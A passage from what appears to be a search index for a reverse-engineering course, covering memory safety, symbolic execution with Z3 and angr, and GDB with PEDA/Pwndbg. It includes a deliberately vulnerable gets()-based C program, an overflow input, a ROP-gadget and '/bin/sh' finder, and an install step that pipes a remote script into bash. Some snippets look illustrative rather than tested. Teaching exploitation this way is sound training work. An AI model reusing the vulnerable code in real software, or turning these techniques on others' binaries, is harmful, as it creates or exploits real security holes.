Handle allocation failure\n    return -1;\n}\n\n// Initialize allocated memory\nmemset(ptr, 0, size);\n\n// Always free allocated memory\nfree(ptr);\nptr = NULL; // Prevent use-after-free\n\n// Use calloc for zero-initialized memory\nint *array = calloc(count, sizeof(int));\n</code></pre>"},{"location":"foundations/04-memory/#key-takeaways","title":"Key Takeaways","text":"<p>Memory Management Fundamentals</p> <ul> <li>Stack is fast but limited - use for small, temporary data</li> <li>Heap is flexible but complex - requires manual management</li> <li>Always match malloc with free - prevent memory leaks</li> <li>Check bounds - prevent buffer overflows</li> <li>Initialize pointers to NULL - prevent use-after-free</li> </ul> <p>Security Implications</p> <ul> <li>Stack overflows can overwrite return addresses</li> <li>Heap corruption can lead to arbitrary code execution</li> <li>Memory leaks can cause denial of service</li> <li>Use-after-free can be exploited for code reuse</li> <li>Understanding memory layout is crucial for exploitation</li> </ul> <p>Debugging and Analysis</p> <ul> <li>Use Valgrind and AddressSanitizer for memory error detection</li> <li>Understand memory layout for reverse engineering</li> <li>Learn to recognize memory corruption patterns</li> <li>Practice with both debugging and exploitation perspectives</li> </ul> <p>Next: Reverse Engineering - Static Analysis</p>"},{"location":"reverse-engineering/01-symbolic-execution/","title":"Symbolic Execution with Z3 and angr","text":"<p>Symbolic execution is a powerful technique for analyzing programs by treating inputs as symbolic variables rather than concrete values. This allows exploration of multiple execution paths simultaneously and can help discover vulnerabilities, generate test cases, and solve complex constraints.</p>"},{"location":"reverse-engineering/01-symbolic-execution/#understanding-symbolic-execution","title":"Understanding Symbolic Execution","text":""},{"location":"reverse-engineering/01-symbolic-execution/#what-is-symbolic-execution","title":"What is Symbolic Execution?","text":"<p>Symbolic execution involves: 1. Symbolic variables - Inputs represented as mathematical symbols 2. Path constraints - Conditions that must be satisfied for each execution path 3. Constraint solving - Using SMT solvers to find concrete values 4. Path exploration - Systematically exploring different program paths</p>"},{"location":"reverse-engineering/01-symbolic-execution/#key-concepts","title":"Key Concepts","text":"<pre><code>Program State:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Symbolic Variables  \u2502 \u03b1, \u03b2, \u03b3 (unknown values)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Path Constraints    \u2502 \u03b1 &gt; 0, \u03b2 &lt; 100, \u03b1 + \u03b2 = \u03b3\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Program Counter     \u2502 Current execution location\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#z3-solver-fundamentals","title":"Z3 Solver Fundamentals","text":""},{"location":"reverse-engineering/01-symbolic-execution/#installation-and-setup","title":"Installation and Setup","text":"<pre><code># Install Z3\npip install z3-solver\n\n# Basic Z3 usage\nfrom z3 import *\n\n# Create solver instance\nsolver = Solver()\n\n# Create symbolic variables\nx = Int('x')\ny = Int('y')\n\n# Add constraints\nsolver.add(x &gt; 0)\nsolver.add(y &lt; 100)\nsolver.add(x + y == 50)\n\n# Check satisfiability\nif solver.check() == sat:\n    model = solver.model()\n    print(f\"x = {model[x]}, y = {model[y]}\")\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#z3-data-types","title":"Z3 Data Types","text":"<pre><code>from z3 import *\n\n# Integer variables\nx = Int('x')\ny = Int('y')\n\n# Bit-vector variables (for binary analysis)\na = BitVec('a', 32)  # 32-bit variable\nb = BitVec('b', 64)  # 64-bit variable\n\n# Boolean variables\nflag = Bool('flag')\n\n# Arrays (for memory modeling)\nmem = Array('mem', BitVecSort(32), BitVecSort(8))  # Address -&gt; Byte mapping\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#solving-simple-constraints","title":"Solving Simple Constraints","text":"<pre><code>#!/usr/bin/env python3\nfrom z3 import *\n\ndef solve_basic_equation():\n    \"\"\"Solve: 2x + 3y = 20, x &gt; 0, y &gt; 0\"\"\"\n\n    solver = Solver()\n\n    # Variables\n    x = Int('x')\n    y = Int('y')\n\n    # Constraints\n    solver.add(2*x + 3*y == 20)\n    solver.add(x &gt; 0)\n    solver.add(y &gt; 0)\n\n    # Solve\n    if solver.check() == sat:\n        model = solver.model()\n        print(f\"Solution: x = {model[x]}, y = {model[y]}\")\n\n        # Find all solutions\n        solutions = []\n        while solver.check() == sat:\n            m = solver.model()\n            solutions.append((m[x].as_long(), m[y].as_long()))\n\n            # Block this solution\n            solver.add(Or(x != m[x], y != m[y]))\n\n        print(f\"All solutions: {solutions}\")\n    else:\n        print(\"No solution found\")\n\nsolve_basic_equation()\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#bit-vector-operations","title":"Bit-Vector Operations","text":"<pre><code>#!/usr/bin/env python3\nfrom z3 import *\n\ndef bitvector_analysis():\n    \"\"\"Analyze bit-vector operations\"\"\"\n\n    solver = Solver()\n\n    # 32-bit variables\n    x = BitVec('x', 32)\n    y = BitVec('y', 32)\n\n    # Bit operations\n    solver.add(x &amp; y == 0x12345678)  # AND\n    solver.add(x | y == 0xabcdef00)  # OR\n    solver.add(x ^ y == 0x99999988)  # XOR\n\n    # Arithmetic\n    solver.add(x + y == 0xdeadbeef)\n\n    # Shifts\n    solver.add(x &lt;&lt; 2 == y &gt;&gt; 4)\n\n    if solver.check() == sat:\n        model = solver.model()\n        print(f\"x = 0x{model[x].as_long():08x}\")\n        print(f\"y = 0x{model[y].as_long():08x}\")\n\nbitvector_analysis()\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#angr-framework","title":"angr Framework","text":""},{"location":"reverse-engineering/01-symbolic-execution/#installation-and-basic-usage","title":"Installation and Basic Usage","text":"<pre><code># Install angr\npip install angr\n\n# Basic angr script\nimport angr\nimport sys\n\ndef basic_angr_analysis(binary_path):\n    # Create project\n    proj = angr.Project(binary_path, auto_load_libs=False)\n\n    # Create initial state\n    state = proj.factory.entry_state()\n\n    # Create simulation manager\n    simgr = proj.factory.simulation_manager(state)\n\n    # Explore until main function\n    simgr.explore(find=proj.loader.main_object.get_symbol('main').rebased_addr)\n\n    if simgr.found:\n        print(f\"Found {len(simgr.found)} paths to main\")\n    else:\n        print(\"Could not reach main\")\n\n# Usage\nbasic_angr_analysis('./target_binary')\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#program-analysis-with-angr","title":"Program Analysis with angr","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport claripy\n\ndef analyze_simple_crackme(binary_path):\n    \"\"\"Analyze a simple password checking program\"\"\"\n\n    # Load binary\n    proj = angr.Project(binary_path, auto_load_libs=False)\n\n    # Find addresses of interest\n    # Assume we want to reach a \"success\" message\n    success_addr = 0x401234  # Address of success branch\n    failure_addr = 0x401250  # Address of failure branch\n\n    # Create symbolic state at program entry\n    state = proj.factory.entry_state()\n\n    # Create simulation manager\n    simgr = proj.factory.simulation_manager(state)\n\n    # Explore paths\n    simgr.explore(find=success_addr, avoid=failure_addr)\n\n    if simgr.found:\n        # Found a path to success\n        found_state = simgr.found[0]\n\n        # Extract input that leads to success\n        flag = found_state.posix.dumps(0)  # stdin input\n        print(f\"Found solution: {flag}\")\n\n        return flag\n    else:\n        print(\"No solution found\")\n        return None\n\nanalyze_simple_crackme('./crackme')\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#symbolic-input-and-constraints","title":"Symbolic Input and Constraints","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport claripy\n\ndef symbolic_input_analysis():\n    \"\"\"Create symbolic input and analyze program behavior\"\"\"\n\n    proj = angr.Project('./target', auto_load_libs=False)\n\n    # Create symbolic input\n    flag_length = 20\n    flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]\n    flag = claripy.Concat(*flag_chars)\n\n    # Constrain input to printable ASCII\n    constraints = []\n    for char in flag_chars:\n        constraints.append(char &gt;= 0x20)  # Printable ASCII\n        constraints.append(char &lt;= 0x7e)\n\n    # Create state with symbolic stdin\n    state = proj.factory.entry_state(stdin=flag)\n\n    # Add constraints\n    for constraint in constraints:\n        state.solver.add(constraint)\n\n    # Simulation\n    simgr = proj.factory.simulation_manager(state)\n\n    # Define success condition\n    def is_successful(state):\n        output = state.posix.dumps(1)  # stdout\n        return b'Correct!' in output\n\n    def should_abort(state):\n        output = state.posix.dumps(1)\n        return b'Wrong!' in output\n\n    # Explore with custom conditions\n    simgr.explore(find=is_successful, avoid=should_abort)\n\n    if simgr.found:\n        solution_state = simgr.found[0]\n        solution = solution_state.solver.eval(flag, cast_to=bytes)\n        print(f\"Solution: {solution}\")\n\nsymbolic_input_analysis()\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#practical-applications","title":"Practical Applications","text":""},{"location":"reverse-engineering/01-symbolic-execution/#vulnerability-discovery","title":"Vulnerability Discovery","text":"<pre><code>#!/usr/bin/env python3\nimport angr\n\ndef find_buffer_overflow(binary_path):\n    \"\"\"Detect potential buffer overflow vulnerabilities\"\"\"\n\n    proj = angr.Project(binary_path)\n\n    # Create state with symbolic input\n    state = proj.factory.entry_state()\n\n    # Hook dangerous functions\n    dangerous_functions = ['strcpy', 'gets', 'sprintf']\n\n    for func_name in dangerous_functions:\n        try:\n            func_addr = proj.loader.find_symbol(func_name).rebased_addr\n\n            def check_overflow(state):\n                # Check if we can control return address\n                rsp = state.regs.rsp\n                ret_addr = state.memory.load(rsp, 8)\n\n                if state.solver.symbolic(ret_addr):\n                    print(f\"Potential buffer overflow in {func_name}\")\n                    print(f\"Can control return address: {ret_addr}\")\n\n                    # Try to solve for specific value\n                    if state.solver.satisfiable(extra_constraints=[ret_addr == 0x4141414141414141]):\n                        print(\"Return address is controllable!\")\n\n            proj.hook(func_addr, check_overflow)\n\n        except AttributeError:\n            continue  # Function not found\n\n    # Simulate execution\n    simgr = proj.factory.simulation_manager(state)\n    simgr.run()\n\nfind_buffer_overflow('./vulnerable_program')\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#automatic-exploit-generation","title":"Automatic Exploit Generation","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport claripy\n\ndef generate_rop_chain(binary_path):\n    \"\"\"Automatically generate ROP chain\"\"\"\n\n    proj = angr.Project(binary_path)\n\n    # Find ROP gadgets\n    cfg = proj.analyses.CFGFast()\n    rop = proj.analyses.ROP()\n\n    # Search for useful gadgets\n    pop_rdi = rop.find_gadgets_with_only_insns(['pop rdi', 'ret'])\n    pop_rsi = rop.find_gadgets_with_only_insns(['pop rsi', 'ret'])\n\n    if pop_rdi:\n        print(f\"Found 'pop rdi; ret' at: 0x{pop_rdi[0].addr:x}\")\n\n    if pop_rsi:\n        print(f\"Found 'pop rsi; ret' at: 0x{pop_rsi[0].addr:x}\")\n\n    # Find system() and \"/bin/sh\"\n    try:\n        system_addr = proj.loader.find_symbol('system').rebased_addr\n        print(f\"system() at: 0x{system_addr:x}\")\n    except:\n        print(\"system() not found\")\n\n    # Search for \"/bin/sh\" string\n    binsh_addr = None\n    for addr, data in proj.loader.memory.backers():\n        if b'/bin/sh' in data:\n            binsh_addr = addr + data.find(b'/bin/sh')\n            print(f\"/bin/sh at: 0x{binsh_addr:x}\")\n            break\n\ngenerate_rop_chain('./target')\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#constraint-solving-for-reverse-engineering","title":"Constraint Solving for Reverse Engineering","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport claripy\n\ndef solve_hash_function():\n    \"\"\"Reverse a custom hash function to find input\"\"\"\n\n    # Simulate the hash function symbolically\n    def custom_hash(input_val):\n        \"\"\"Example hash function: ((x * 31) + 17) ^ 0xdeadbeef\"\"\"\n        return ((input_val * 31) + 17) ^ 0xdeadbeef\n\n    # Create symbolic variable\n    x = claripy.BVS('x', 32)\n\n    # Target hash value\n    target_hash = 0x12345678\n\n    # Create constraint\n    constraint = custom_hash(x) == target_hash\n\n    # Solve\n    solver = claripy.Solver()\n    solver.add(constraint)\n\n    if solver.satisfiable():\n        solution = solver.eval(x, 1)[0]\n        print(f\"Input that produces hash 0x{target_hash:x}: 0x{solution:x}\")\n\n        # Verify\n        result = custom_hash(solution)\n        print(f\"Verification: custom_hash(0x{solution:x}) = 0x{result:x}\")\n    else:\n        print(\"No solution found\")\n\nsolve_hash_function()\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"reverse-engineering/01-symbolic-execution/#state-merging-and-exploration","title":"State Merging and Exploration","text":"<pre><code>#!/usr/bin/env python3\nimport angr\n\ndef advanced_exploration(binary_path):\n    \"\"\"Advanced state exploration techniques\"\"\"\n\n    proj = angr.Project(binary_path)\n\n    # Custom exploration strategy\n    state = proj.factory.entry_state()\n    simgr = proj.factory.simulation_manager(state)\n\n    # Exploration with depth limit\n    simgr.explore(find=lambda s: 'target_function' in str(s.addr), \n                 n=100)  # Limit exploration steps\n\n    # State merging for efficiency\n    simgr.use_technique(angr.exploration_techniques.Veritesting())\n\n    # Memory-efficient exploration\n    simgr.use_technique(angr.exploration_techniques.Spiller())\n\n    # Custom stash management\n    def interesting_state(state):\n        # Only keep states that call specific functions\n        return any(call.name == 'malloc' for call in state.history.actions)\n\n    simgr.move(from_stash='active', to_stash='interesting', \n              filter_func=interesting_state)\n\nadvanced_exploration('./complex_binary')\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#memory-model-manipulation","title":"Memory Model Manipulation","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport claripy\n\ndef memory_analysis():\n    \"\"\"Analyze memory access patterns\"\"\"\n\n    proj = angr.Project('./target')\n    state = proj.factory.entry_state()\n\n    # Create symbolic memory\n    symbolic_addr = claripy.BVS('addr', 64)\n    symbolic_data = claripy.BVS('data', 32)\n\n    # Constrain address to valid range\n    state.solver.add(symbolic_addr &gt;= 0x400000)\n    state.solver.add(symbolic_addr &lt; 0x500000)\n\n    # Write symbolic data to symbolic address\n    state.memory.store(symbolic_addr, symbolic_data)\n\n    # Read back and analyze\n    read_data = state.memory.load(symbolic_addr, 4)\n\n    # Check if read equals write\n    if state.solver.satisfiable(extra_constraints=[read_data == symbolic_data]):\n        print(\"Memory model is consistent\")\n\n    # Find specific memory corruption\n    corruption_constraint = symbolic_addr == 0x41414141\n    if state.solver.satisfiable(extra_constraints=[corruption_constraint]):\n        print(\"Can write to controlled address!\")\n\nmemory_analysis()\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#tool-integration","title":"Tool Integration","text":""},{"location":"reverse-engineering/01-symbolic-execution/#gdb-integration","title":"GDB Integration","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport subprocess\n\ndef angr_gdb_integration(binary_path, breakpoint_addr):\n    \"\"\"Combine angr analysis with GDB debugging\"\"\"\n\n    # Angr analysis first\n    proj = angr.Project(binary_path)\n    state = proj.factory.entry_state()\n    simgr = proj.factory.simulation_manager(state)\n\n    # Find path to specific address\n    simgr.explore(find=breakpoint_addr)\n\n    if simgr.found:\n        found_state = simgr.found[0]\n\n        # Extract register state\n        registers = {\n            'rax': found_state.regs.rax,\n            'rbx': found_state.regs.rbx,\n            'rcx': found_state.regs.rcx,\n            'rdx': found_state.regs.rdx,\n        }\n\n        # Generate GDB script\n        gdb_script = f\"\"\"\n        file {binary_path}\n        break *{hex(breakpoint_addr)}\n        run\n        \"\"\"\n\n        for reg, val in registers.items():\n            if found_state.solver.symbolic(val):\n                # If symbolic, find a concrete value\n                concrete_val = found_state.solver.eval(val)\n                gdb_script += f\"set ${reg} = {hex(concrete_val)}\\n\"\n\n        # Write GDB script\n        with open('angr_gdb.gdb', 'w') as f:\n            f.write(gdb_script)\n\n        print(\"Generated GDB script: angr_gdb.gdb\")\n        print(\"Run with: gdb -x angr_gdb.gdb\")\n\nangr_gdb_integration('./target', 0x401234)\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#automated-analysis-pipeline","title":"Automated Analysis Pipeline","text":"<pre><code>#!/usr/bin/env python3\nimport angr\nimport os\nimport json\n\ndef automated_analysis_pipeline(binary_path):\n    \"\"\"Complete automated analysis pipeline\"\"\"\n\n    results = {\n        'binary': binary_path,\n        'vulnerabilities': [],\n        'interesting_functions': [],\n        'gadgets': [],\n        'strings': []\n    }\n\n    try:\n        # Load binary\n        proj = angr.Project(binary_path, auto_load_libs=False)\n\n        # CFG analysis\n        cfg = proj.analyses.CFGFast()\n        results['functions'] = len(cfg.functions)\n\n        # Find interesting functions\n        dangerous_funcs = ['strcpy', 'gets', 'sprintf', 'scanf']\n        for func_name in dangerous_funcs:\n            if proj.loader.find_symbol(func_name):\n                results['interesting_functions'].append(func_name)\n\n        # ROP gadget analysis\n        rop = proj.analyses.ROP()\n        gadgets = rop.find_gadgets_with_only_insns(['pop rdi', 'ret'])\n        if gadgets:\n            results['gadgets'].extend([hex(g.addr) for g in gadgets[:5]])\n\n        # String analysis\n        strings = []\n        for addr, data in proj.loader.memory.backers():\n            # Find printable strings\n            current_string = b''\n            for byte in data:\n                if 32 &lt;= byte &lt;= 126:  # Printable ASCII\n                    current_string += bytes([byte])\n                else:\n                    if len(current_string) &gt; 4:\n                        strings.append(current_string.decode('ascii'))\n                    current_string = b''\n\n        results['strings'] = strings[:10]  # First 10 strings\n\n        # Vulnerability detection\n        state = proj.factory.entry_state()\n        simgr = proj.factory.simulation_manager(state)\n\n        # Look for potential overflows\n        for i in range(50):  # Limited exploration\n            if not simgr.active:\n                break\n\n            simgr.step()\n\n            for state in simgr.active:\n                # Check for symbolic return address\n                try:\n                    rsp = state.regs.rsp\n                    ret_addr = state.memory.load(rsp, 8)\n                    if state.solver.symbolic(ret_addr):\n                        results['vulnerabilities'].append({\n                            'type': 'potential_buffer_overflow',\n                            'address': hex(state.addr)\n                        })\n                except:\n                    continue\n\n    except Exception as e:\n        results['error'] = str(e)\n\n    # Save results\n    output_file = f\"{os.path.basename(binary_path)}_analysis.json\"\n    with open(output_file, 'w') as f:\n        json.dump(results, f, indent=2)\n\n    print(f\"Analysis complete. Results saved to {output_file}\")\n    return results\n\n# Usage\nresults = automated_analysis_pipeline('./target_binary')\nprint(json.dumps(results, indent=2))\n</code></pre>"},{"location":"reverse-engineering/01-symbolic-execution/#key-takeaways","title":"Key Takeaways","text":"<p>Symbolic Execution Fundamentals</p> <ul> <li>Symbolic variables represent unknown inputs as mathematical symbols</li> <li>Path exploration allows analysis of multiple execution paths</li> <li>Constraint solving finds concrete values satisfying conditions</li> <li>Z3 solver provides powerful SMT solving capabilities</li> <li>angr framework enables comprehensive binary analysis</li> </ul> <p>Limitations and Challenges</p> <ul> <li>Path explosion can make analysis intractable</li> <li>Complex constraints may be unsolvable</li> <li>Memory models have limitations</li> <li>Real-world binaries may require significant setup</li> <li>Performance can be slow for large programs</li> </ul> <p>Best Practices</p> <ul> <li>Start with simple examples to understand concepts</li> <li>Use exploration limits to prevent path explosion</li> <li>Combine with other analysis techniques</li> <li>Validate results with dynamic analysis</li> <li>Consider memory and time constraints</li> </ul> <p>Next: Binary Exploitation Fundamentals</p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/","title":"GDB with PEDA/Pwndbg","text":"<p>GDB (GNU Debugger) is a powerful debugger for analyzing and debugging programs. When enhanced with PEDA or Pwndbg, it becomes an indispensable tool for reverse engineering and exploit development.</p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#gdb-basics","title":"GDB Basics","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#installation-and-setup","title":"Installation and Setup","text":"<pre><code># Install GDB\nsudo apt update\nsudo apt install gdb\n\n# Install PEDA\ngit clone https://github.com/longld/peda.git ~/peda\necho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit\n\n# Or install Pwndbg (alternative to PEDA)\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n\n# Or install GEF (another alternative)\nbash -c \"$(curl -fsSL http://gef.blah.cat/sh)\"\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#basic-gdb-commands","title":"Basic GDB Commands","text":"<pre><code># Starting GDB\ngdb ./program                    # Load program\ngdb --args ./program arg1 arg2   # Load with arguments\ngdb -p &lt;pid&gt;                     # Attach to running process\n\n# Basic execution control\nrun [args]                       # Start program\ncontinue (c)                     # Continue execution\nstep (s)                         # Step into functions\nnext (n)                         # Step over functions\nfinish                           # Run until function returns\nkill                             # Kill running program\nquit (q)                         # Exit GDB\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#breakpoint-management","title":"Breakpoint Management","text":"<pre><code># Setting breakpoints\nbreak main                       # Break at function\nbreak *0x400000                  # Break at address\nbreak filename.c:42              # Break at line number\nbreak +10                        # Break 10 lines ahead\nbreak if $eax == 0x41            # Conditional breakpoint\n\n# Breakpoint operations\ninfo breakpoints                 # List all breakpoints\ndelete 1                         # Delete breakpoint 1\ndelete                           # Delete all breakpoints\ndisable 1                        # Disable breakpoint 1\nenable 1                         # Enable breakpoint 1\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#memory-examination","title":"Memory Examination","text":"<pre><code># Examine memory\nx/10wx $esp                      # 10 words in hex at ESP\nx/20i $eip                       # 20 instructions at EIP\nx/s 0x400000                     # String at address\nx/100bx $esp                     # 100 bytes in hex\n\n# Format specifiers\nx/[count][size][format] address\n# size: b(byte), h(halfword), w(word), g(giant/8bytes)\n# format: x(hex), d(decimal), u(unsigned), o(octal), t(binary), a(address), c(char), s(string), i(instruction)\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#register-operations","title":"Register Operations","text":"<pre><code># View registers\ninfo registers                   # All general registers\ninfo all-registers              # All registers including FPU/SSE\nprint $eax                       # Print specific register\nprint/x $eax                     # Print in hex\n\n# Modify registers\nset $eax = 0x41414141           # Set register value\nset $eip = 0x8048000           # Change instruction pointer\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#peda-enhanced-features","title":"PEDA Enhanced Features","text":"<p>PEDA (Python Exploit Development Assistance) adds many useful features to GDB:</p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#enhanced-display","title":"Enhanced Display","text":"<pre><code># PEDA automatically shows:\n# - Register values\n# - Stack contents  \n# - Disassembly around current instruction\n# - Memory mappings\n\n# Force refresh display\ncontext                          # Show context information\ncontext stack                   # Show only stack\ncontext code                    # Show only code\ncontext register                # Show only registers\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#pattern-generation-and-analysis","title":"Pattern Generation and Analysis","text":"<pre><code># Generate cyclic pattern\npattern create 100               # Create 100-byte pattern\npattern create 100 pattern.txt  # Save to file\n\n# Find offset in pattern\npattern offset 0x41414141        # Find offset of value in pattern\npattern offset $eip              # Find offset of current EIP\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#security-analysis","title":"Security Analysis","text":"<pre><code># Check security features\nchecksec                         # Show binary protections\n\n# Find gadgets for ROP\nropsearch \"pop rdi\"             # Search for ROP gadgets\nropsearch \"pop rdi; ret\"        # More specific search\n\n# Search for instructions\nasmsearch \"jmp esp\"             # Find JMP ESP instructions\nasmsearch \"int 0x80\"            # Find system call instructions\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#memory-searching","title":"Memory Searching","text":"<pre><code># Search for patterns\nsearchmem \"password\"            # Search for string in memory\nsearchmem 0x41414141           # Search for value\nsearchmem \"\\x41\\x41\\x41\\x41\"  # Search for bytes\n\n# Search in specific regions\nsearchmem \"password\" stack     # Search only in stack\nsearchmem 0x41414141 heap      # Search only in heap\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#pwndbg-enhanced-features","title":"Pwndbg Enhanced Features","text":"<p>Pwndbg is a modern alternative to PEDA with additional features:</p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#heap-analysis","title":"Heap Analysis","text":"<pre><code># Heap commands\nheap                            # Show heap information\nheap chunks                     # Show all heap chunks\nheap bins                       # Show heap bins\narena                          # Show arena information\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#enhanced-memory-display","title":"Enhanced Memory Display","text":"<pre><code># Memory visualization\nvmmap                          # Show memory mappings\nstack                          # Show stack contents\ntelescope $rsp                 # Smart stack/memory viewer\nhexdump $rsp                   # Hex dump of memory\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#advanced-search","title":"Advanced Search","text":"<pre><code># Search capabilities\nsearch -t string \"password\"    # Search for string\nsearch -t bytes \"\\x41\\x41\"     # Search for bytes\nsearch -t qword 0x41414141     # Search for 8-byte value\n\n# Find references\nxrefs 0x400000                 # Find cross-references to address\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#practical-debugging-sessions","title":"Practical Debugging Sessions","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#analyzing-a-buffer-overflow","title":"Analyzing a Buffer Overflow","text":"<pre><code>// debug_target.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf(\"Buffer at: %p\\n\", buffer);\n    printf(\"Enter input: \");\n    gets(buffer);\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n</code></pre> <p>GDB Session: <pre><code># Compile with debug info\ngcc -g -fno-stack-protector -no-pie -o debug_target debug_target.c\n\n# Start debugging session\n$ gdb ./debug_target\n(gdb) set disassembly-flavor intel\n(gdb) break vulnerable_function\n(gdb) run\n\n# When breakpoint hits\n(gdb) disas vulnerable_function\n(gdb) break *vulnerable_function+XX  # Break after gets()\n(gdb) continue\n\n# Input that causes overflow\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\n\n# Examine the crash\n(gdb) info registers\n(gdb) x/20wx $rsp\n(gdb) bt  # Backtrace\n</code></pre></p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#dynamic-analysis-workflow","title":"Dynamic Analysis Workflow","text":"<pre><code># Start with context information\n(gdb) context\n\n# Set breakpoint at function entry\n(gdb) break main\n(gdb) run\n\n# Examine function prologue\n(gdb) disas main\n(gdb) si  # Step through instructions\n\n# Watch memory changes\n(gdb) watch *0x601040  # Watch memory location\n(gdb) rwatch *0x601040 # Watch for reads\n(gdb) awatch *0x601040 # Watch for reads/writes\n\n# Trace function calls\n(gdb) set logging on\n(gdb) set trace-commands on\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#automated-analysis-script","title":"Automated Analysis Script","text":"<pre><code># gdb_script.py\nimport gdb\n\nclass BufferOverflowAnalyzer(gdb.Command):\n    \"\"\"Analyze buffer overflow potential\"\"\"\n\n    def __init__(self):\n        super(BufferOverflowAnalyzer, self).__init__(\"analyze-overflow\", gdb.COMMAND_USER)\n\n    def invoke(self, arg, from_tty):\n        # Get current frame info\n        frame = gdb.selected_frame()\n\n        # Find dangerous functions\n        dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf']\n\n        # Search for these in the binary\n        for func in dangerous_funcs:\n            try:\n                addr = gdb.parse_and_eval(f\"&amp;{func}\")\n                print(f\"Found dangerous function {func} at {addr}\")\n            except:\n                pass\n\n        # Analyze current stack frame\n        try:\n            sp = gdb.parse_and_eval(\"$rsp\")\n            bp = gdb.parse_and_eval(\"$rbp\")\n            print(f\"Stack pointer: {sp}\")\n            print(f\"Base pointer: {bp}\")\n            print(f\"Stack frame size: {int(bp) - int(sp)}\")\n        except:\n            print(\"Could not analyze stack frame\")\n\nBufferOverflowAnalyzer()\n</code></pre> <p>Load script in GDB: <pre><code>(gdb) source gdb_script.py\n(gdb) analyze-overflow\n</code></pre></p>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#advanced-debugging-techniques","title":"Advanced Debugging Techniques","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#multi-threaded-debugging","title":"Multi-threaded Debugging","text":"<pre><code># Thread operations\ninfo threads                    # List all threads\nthread 2                        # Switch to thread 2\nthread apply all bt             # Backtrace all threads\nset scheduler-locking on        # Lock scheduler to current thread\n\n# Thread-specific breakpoints\nbreak main thread 2             # Break in main only for thread 2\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#core-dump-analysis","title":"Core Dump Analysis","text":"<pre><code># Generate core dump\nulimit -c unlimited             # Enable core dumps\necho \"core.%p\" | sudo tee /proc/sys/kernel/core_pattern\n\n# Analyze core dump\ngdb ./program core.1234\n(gdb) bt                        # Backtrace\n(gdb) info registers            # Register state at crash\n(gdb) x/20wx $rsp              # Stack contents\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#remote-debugging","title":"Remote Debugging","text":"<pre><code># On target machine\ngdbserver :1234 ./program\n\n# On debugging machine  \ngdb ./program\n(gdb) target remote target-ip:1234\n(gdb) continue\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#anti-debugging-detection","title":"Anti-debugging Detection","text":"<pre><code># Check for debugger presence\n(gdb) catch syscall ptrace      # Catch ptrace syscalls\n(gdb) break IsDebuggerPresent   # Break on anti-debug function\n\n# Bypass timing 